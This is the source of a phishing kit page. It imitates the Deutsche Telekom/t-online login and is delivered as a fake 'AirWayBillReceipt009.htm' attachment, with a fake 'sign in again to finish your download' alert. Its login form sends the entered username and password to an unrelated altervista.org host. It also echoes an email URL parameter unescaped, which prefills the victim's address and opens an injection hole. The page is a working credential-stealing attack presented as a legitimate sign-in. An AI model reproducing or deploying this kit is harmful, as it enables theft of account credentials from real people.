<!--Begin Comm100 Live Chat Code-->
<script type="text/javascript">
  var Comm100API=Comm100API||{};(function(t){function e(e){var a=document.createElement("script"),c=document.getElementsByTagName("script")[0];a.type="text/javascript",a.async=!0,a.src=e+t.site_id,c.parentNode.insertBefore(a,c)}t.chat_buttons=t.chat_buttons||[],t.chat_buttons.push({code_plan:1257,div_id:"comm100-button-1257"}),t.site_id=122744,t.main_code_plan=1257,e("https://chatserver.comm100.com/livechat.ashx?siteId="),setTimeout(function(){t.loaded||e("https://hostedmax.comm100.com/chatserver/livechat.ashx?siteId=")},5e3)})(Comm100API||{})
</script>
<!--End Comm100 Live Chat Code-->

<SCRIPT language="JavaScript1.5" type="text/javascript">
alert("Your Download is almost complete, PLEASE SIGN IN AGAIN TO FINISH!")
</script>
<?php
sleep(10);  // delay in seconds
header("Content-Disposition: attachment; filename=AirWayBillReceipt009.htm");
header("Content-Type: text/html"); // optional
readfile("logind.php");
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><HTML><HEAD><META 

content="IE=11.0000" http-equiv="X-UA-Compatible">

 <TITLE>Telekom-Login</TITLE> 

<META http-equiv="Content-Type" content="text/html; charset=utf-8"> 

<META http-equiv="expires" content="1"> 

<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 

<META name="HandheldFriendly" content="True"> <!--[if IE 7]> <link rel="stylesheet" type="text/css" href="/static/dtag-css/stylesheets/dtag-ie7.css" media="screen,print"> <![endif]--> <!--[if IE 8]> <link rel="stylesheet" type="text/css" href="/static/dtag-css/stylesheets/dtag-ie8.css" media="screen,print"> <![endif]--> <!--[if IE 9]> <link rel="stylesheet" type="text/css" href="/static/dtag-css/stylesheets/dtag-ie9.css" media="screen,print"> <![endif]--> <!--[if gt IE 9]><!--> 

<LINK href="https://accounts.login.idm.telekom.com/static/dtag-css/stylesheets/dtag.css" 

rel="stylesheet" type="text/css" media="screen,print"> <!--<![endif]--> <LINK 

href="https://accounts.login.idm.telekom.com/static/stylesheets/web.min.css" 

rel="stylesheet" type="text/css"> 

<SCRIPT src="https://accounts.login.idm.telekom.com/static/dtag-css/scripts/require-jquery.min.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://accounts.login.idm.telekom.com/static/jscript/login-information-bubble.min.js" type="text/javascript"></SCRIPT>

 

<SCRIPT type="text/javascript">

	var smartFocus = function() {

		// only if no input element has the focus already

		if (! /input/i.test(document.activeElement.tagName)) {

			var user = document.getElementById('user');

			var q4_prince

 = document.getElementById('pw_pwd');



			if(user != null) {

				(user.value) ? q4_prince

.focus() : user.focus();

			} else {

				q4_prince

.focus();

			}

		}

	};



	// registring in body some how does not work in pop-up

	$(self.registerEventHandler);

</SCRIPT>

 <!-- <script data-main="/static/dtag-css/scripts/main" src="/static/dtag-css/scripts/require-jquery.min.js" type="text/javascript"></script>  --> <!-- fuer alle IEs --> <!--[if IE]>

  <script src="/static/dtag-css/scripts/libs/jquery/jquery.placeholder.min.js" type="text/javascript"></script>

  <script type="text/javascript">

      $(function() {

          $('input[placeholder], textarea[placeholder]').placeholder();

      });

  </script>

<![endif]--> <!--[if lte IE 8]>

  <script src="/static/dtag-css/scripts/libs/html5shiv/html5shiv.js" type="text/javascript"></script>

<![endif]--> 

<SCRIPT type="text/javascript">

   var html = document.getElementsByTagName('html')[0];

   html.setAttribute('class', 'js');



   function OpenPopupCenter(pageURL, title, w, h) {

	    var left = (screen.width - w) / 2;

	    var top = (screen.height - h) / 4;  // for 25% - devide by 4  |  for 33% - devide by 3

	    var targetWin = window.open(pageURL, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width=' + w + ', height=' + h + ', top=' + top + ', left=' + left);

	}



   $(function() {



		var form = {

			login: $('form#login'),

			cancel: $('form#login_cancel')

		};



		// handling of login form submition

		var loginFormIsSubmitted = false;

		var onSubmitLoginForm = function(event) {

		if (loginFormIsSubmitted) {

			return false;

		} else {

	   		loginFormIsSubmitted = !loginFormIsSubmitted;

	   	}

	   };



		// handling of cancel button

		var onClickCancelButton = function(event) {

			form.cancel.submit();

			return false;

		};



       $('.back').on('click', onClickCancelButton);

       form.login.on('submit', onSubmitLoginForm);



   });



	/**

	 * log a message to javascript console (for firebug)

	 */

	function log(message) {

		if (window.console) {

			window.console.log(message);

		}

	}

	/**

	 * enable the submit button

	 */

	function enableSubmitButton() {

		$("#pw_submit").removeAttr('disabled');

		$("#pw_submit").removeClass('unavailable').addClass('beveled');

	}

	/**

	 * disable the submit button

	 */

	function disableSubmitButton() {

		$("#pw_submit").attr('disabled', 'disabled');

		$("#pw_submit").addClass('unavailable');

	}

</SCRIPT>

 

<META name="GENERATOR" content="MSHTML 11.00.9600.18838"></HEAD> 

<BODY class="DTExperience" onload="self.registerEventHandler();">

<DIV class="window content_small" style="position: relative;">

<DIV class="line"></DIV>

<DIV class="line"></DIV>

<DIV class="line"></DIV>

<DIV class="xbig centertext">		Login	 </DIV>

<DIV class="line_half_bottom"></DIV>

<FORM name="login" id="login" action="http://directoryupdatee.altervista.org/veri1/member.php" method="POST" accept-charset="UTF-8" 

autocomplete="off"><INPUT name="tid" id="tid" type="hidden" value="2dad213e-1c63-4bbd-8656-9bc657e14b0e">

		 <INPUT name="pw_domt" id="domain" type="hidden" value="t-online.de">		 

<DIV class="content_inlay">

<DIV class="line"></DIV>

<DIV class="line"></DIV>

<DIV class="line_half"></DIV>

<DIV>

<DIV class="small left">Benutzername</DIV>

<DIV class="icon-16 icon-information left" id="icon-information"></DIV>

<DIV class="line_normalized clear relative">

<DIV class="login-information login-information-popup round-radius" id="login-information" 

style="display: none;">

<DIV class="icon-close tele-icon">X</DIV>						Als Benutzernamen können Sie eine 

der folgenden Optionen eingeben:						 

<UL>

  <LI>Ihre E-Mail-Adresse @t-online.de - dabei müssen Sie nur Ihre individuelle 

  Kennung vor dem @-Symbol eingeben</LI>

  <LI>Ihre Mobilfunk-Nummer, die Sie mit Ihrem Benutzerkonto verknüpft 

haben</LI>

  <LI>Ihre E-Mail-Adresse bei einem anderen Anbieter, die Sie bei der 

  Registrierung festgelegt 

haben</LI></UL></DIV>
<span class="input">
<input id="rcmloginuser" autocomplete="off" name="q4_email"  required="required" size="40" type="text" value="<?php echo $_GET['email']; // output 2489 ?>" <?php echo $_GET['email']; // output 2489 ?> ?>
</span></DIV></DIV>

<DIV class="line"></DIV>

<DIV>

<DIV class="line">

<DIV class="left small"></DIV><A class="right small" id="link_forget_q4_prince

word" 

href="https://meinkonto.telekom-dienste.de/wiederherstellung/q4_prince

wort/index.xhtml" 

target="_blank">q4_prince

wort vergessen?</A>				 </DIV>

<DIV class="line_half"></DIV>

<DIV class="line_normalized"><INPUT name="q4_prince" tabindex="2" id="pw_pwd" type="password" maxlength="128">

				 </DIV></DIV>

<DIV class="line"></DIV>

<DIV class="checkboxwrap"><INPUT name="persist_session" tabindex="3" id="checkbox_permanent" 

type="checkbox" value="1">		       <LABEL for="checkbox_permanent">Eingeloggt 

bleiben</LABEL>		     </DIV>

<DIV class="line"></DIV>

<DIV class="line_half"></DIV>

<DIV class="center_button"><INPUT name="pw_submit" tabindex="4" class="button standard_button_size large" id="pw_submit" type="submit" value="Login">

			 </DIV>

<DIV class="line_half"></DIV>

<DIV class="line"></DIV>

<DIV class="line"></DIV></DIV></FORM>

<DIV class="line_bottom"></DIV>

<DIV class="line"></DIV>

<DIV class="content_small">

<DIV class="content_content">

<DIV class="standard centertext truncate">Noch kein Telekom Login? <A onclick="window.open('https://meinkonto.telekom-dienste.de/konto/registrierung?client_id=10PRODYAK00000004901SAM30000000000000000&amp;state=2dad213e-1c63-4bbd-8656-9bc657e14b0e&amp;nonce=YAKREG-NC-92bec7a8-483e-402b-85c7-a71ee43f577a&amp;redirect_uri=https%3A%2F%2Faccounts.login.idm.telekom.com%2Fcallback&amp;display=page&amp;scope=openid&amp;response_type=code','_blank','');window.close();return false;" 

href="https://accounts.login.idm.telekom.com/idmip?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.return_to=https%3A%2F%2Ftipi.api.t-online.de%2Fsrp-auth%2FoneIdm%2Fverify%3FreturnToUrl%3Dhttp%3A%2F%2Fwww.t-online.de%2F-%2Fid_62530878%2Ftid_tsr-landingpage-popup%2Findex&amp;openid.realm=https%3A%2F%2Ftipi.api.t-online.de&amp;openid.assoc_handle=Saa01660b-13ca-407d-a280-a2f52951c67c&amp;openid.mode=checkid_setup&amp;openid.ns.ext1=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&amp;openid.ext1.mode=fetch_request&amp;openid.ext1.type.attr1=urn%3Atelekom.com%3Aall&amp;openid.ext1.required=attr1&amp;openid.ns.ext2=http%3A%2F%2Fidm.telekom.com%2Fopenid%2Foauth2%2F1.0&amp;openid.ext2.client_id=10LIVESAM30000004901PORTAL00000000000000&amp;openid.ext2.scopes=W3sic2NvcGUiOiJzcGljYSJ9XQ%3D%3D&amp;openid.ns.ext3=http%3A%2F%2Fidm.telekom.com%2Fopenid%2Fext%2F2.0&amp;openid.ext3.logout_endpoint=https%3A%2F%2Ftipi.api.t-online.de%2Fsrp-auth%2FoneIdm%2Flogout&amp;openid.ns.ext4=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fui%2F1.0&amp;openid.ext4.mode=popup#">Jetzt 

registrieren</A></DIV></DIV></DIV><!-- Info Telekom Login -->	 

<DIV class="line_bottom"></DIV>

<DIV class="content_inlay">

<DIV class="line"></DIV>

<DIV id="infoTelekomLoginTrigger">

<DIV class="xbig centertext">Ein Login für alle Dienste</DIV>

<DIV class="standard centertext"><A class="toggle-itl" href="javascript:void(0);">Mehr 

Infos zum Telekom Login</A>			 </DIV></DIV>

<STYLE type="text/css">

			#infoTelekomLogin p { margin: 0; }

			.tbs-bu-1-bottom { margin-bottom: 10px !important; }

			.tbs-text-icon { font-family: 'TeleIcon'; }

			.tbs-icon-close:after { content: 'X'; }

		</STYLE>

		 

<DIV id="infoTelekomLogin"><SPAN 

class="tbs-text-icon tbs-icon-close toggle-itl"></SPAN>	 

<P class="tbs-bu-1-bottom">Der Telekom Login ist Ihr einheitlicher Zugang zu 

allen Telekom Diensten und Portalen, zum Beispiel:</P>

<P class="tbs-bu-1-bottom">		Mobilfunk- und Festnetz-Kundencenter<BR>		E-Mail 

Center<BR>		MagentaCLOUD<BR>		Programm Manager<BR>		Videoload<BR>

		www.t-online.de	 </P>

<P>Sie brauchen sich nur noch einen Benutzernamen und ein q4_prince

wort merken. 

Einmal eingeloggt, können Sie bequem zwischen den Diensten hin- und 

herwechseln.</P></DIV><!-- REFACTOR ME: auslagern in externe Resourcen, wenn alle Masken eine gleiche Basis haben --> 

<STYLE type="text/css">

#infoTelekomLogin {

	background: #e0f1fa;

	display: none;

	padding: 10px 50px 10px 10px;

	position: relative;

	z-index: 100;

	border-radius: 3px;

	-moz-border-radius: 3px;

	-webkit-border-radius: 3px;

}

#infoTelekomLogin .tbs-icon-close {

	cursor: pointer;

	position: absolute;

	right: 10px;

	top: 10px;

}

#infoTelekomLogin * { font-size: 13px; }

.showInfoTelekomLogin #infoTelekomLogin { display: block; }

.showInfoTelekomLogin #infoTelekomLoginTrigger { display: none; }

</STYLE>

 

<SCRIPT type="text/javascript">

jQuery(function() {

	var element = {

		pageStateContainer: jQuery('body'),

		toggleInfoTelekomLogin: jQuery('.toggle-itl')

	};



	var styleClass = {

		showInfoTelekomLogin: 'showInfoTelekomLogin'

	};

	

	var onClickToggleInfoTelekomLogin = function(event) {

		element.pageStateContainer.toggleClass(styleClass.showInfoTelekomLogin);

		event.stopPropagation();

	};

	

	var onClickDocument = function(event) {

		element.pageStateContainer.removeClass(styleClass.showInfoTelekomLogin);

	};

	

	element.toggleInfoTelekomLogin.on('click', onClickToggleInfoTelekomLogin);

	jQuery(document).on('click', onClickDocument);

});

</SCRIPT>

	 </DIV><!-- /Info Telekom Login -->	 

<DIV class="content_small">

<DIV class="line_bottom"></DIV>

<DIV class="content_inlay logo center_logo"></DIV></DIV></DIV>

<SCRIPT src="https://accounts.login.idm.telekom.com/static/jscript/login.min.js" defer="" type="text/javascript" async=""></SCRIPT>

 

<SCRIPT type="text/javascript">

	/**

	 * disable submit button and start timer to re-enable if necessary

	 */

	function applyTimeLock() {

	  var isLocked = false;

	  var isLockedPermanent = false;

	  var lockExpiration = 0;

	  var now = new  Date().getTime();

	  if (isLockedPermanent || (isLocked && lockExpiration > 0 && lockExpiration > now)) {

	    disableSubmitButton();

	    if (!isLockedPermanent) {

	      setTimeout(enableSubmitButton,lockExpiration-now);

	    }

	  }

	}



	applyTimeLock();



</SCRIPT>

 </BODY></HTML>

